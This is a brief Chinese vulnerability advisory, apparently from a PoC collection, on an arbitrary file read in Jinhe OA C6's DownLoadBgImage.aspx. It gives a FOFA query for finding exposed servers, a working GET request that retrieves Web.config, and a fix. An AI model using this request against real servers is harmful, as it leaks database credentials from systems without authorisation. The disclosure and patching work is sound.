---
source: "R4gd0ll/I-Wanna-Get-All"
---

# 金和OA DownLoadBgImage 任意文件读取漏洞

# 漏洞描述

金和OA C6 的 `JHSoft.Web.AddMenu/LoginTemplate/DownLoadBgImage.aspx` 接口中 `path` 参数未做有效校验，存在任意文件读取漏洞。未授权的远程攻击者可读取服务器任意文件（如站点 `Web.config`），获取数据库连接字符串等敏感信息。

影响范围

金和OA C6

# 漏洞复现

FOFA：app="金和网络-金和OA"

POC：

```
GET /C6/JHSoft.Web.AddMenu/LoginTemplate/DownLoadBgImage.aspx/?path=/C6/Web.config HTTP/1.1
Host: target
```

响应中出现 `<?xml version=` 即读取成功，`path` 参数可替换为目标服务器上的任意文件路径。

# 修复方案

对 `path` 参数做严格白名单校验，禁止绝对路径与目录遍历；联系厂商获取官方补丁并升级。
